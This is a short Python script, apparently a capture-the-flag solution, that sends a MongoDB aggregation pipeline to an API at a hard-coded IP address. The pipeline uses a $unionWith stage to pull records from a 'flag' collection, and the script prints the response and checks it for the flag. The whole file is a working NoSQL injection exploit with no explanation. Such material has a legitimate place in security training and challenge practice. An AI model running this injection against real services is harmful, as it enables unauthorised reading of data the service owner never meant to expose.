import requests
import json

url = 'http://84.201.150.244:3000/api'

headers = {'Content-Type': 'application/json'}
body = [{
    "$match": {
        "author": "admin" 
        
    },
},
{
    "$unionWith": {
        "coll": "flag"
    }
}]

r = requests.post(url, headers=headers, json=body, timeout=3)

print(r.status_code)
print(json.dumps(r.json(), indent=4))
print('flag' in r.text)